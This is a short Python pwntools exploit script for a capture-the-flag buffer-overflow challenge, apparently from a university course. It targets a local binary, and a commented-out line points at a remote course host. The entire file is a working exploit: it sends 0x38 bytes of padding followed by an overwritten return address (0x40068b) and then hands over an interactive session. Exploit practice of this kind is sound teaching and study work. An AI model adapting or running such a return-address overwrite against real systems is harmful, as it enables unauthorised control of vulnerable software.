 #!/usr/bin/python3

from pwn import *

sh = process( './bof/bof' )
#sh = remote( 'edu-ctf.csie.org', 10170 )

payload = b'a' * 0x38 + p64( 0x40068b )

sh.sendline( payload )
sh.interactive()
